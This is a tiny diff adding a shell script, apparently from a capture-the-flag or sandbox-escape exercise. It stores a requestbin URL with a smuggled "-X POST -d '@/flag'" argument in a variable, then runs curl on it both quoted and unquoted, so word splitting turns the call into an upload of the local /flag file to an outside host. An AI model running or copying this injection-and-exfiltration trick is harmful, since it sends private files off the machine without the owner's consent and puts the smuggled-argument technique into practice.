@@ -1,0 +1,6 @@
+set -x
+p="https://requestbin.kanbanbox.com/1nstzp21' -X POST -d '@/flag"
+curl -L "$p"
+curl -L $p
+
+set +x
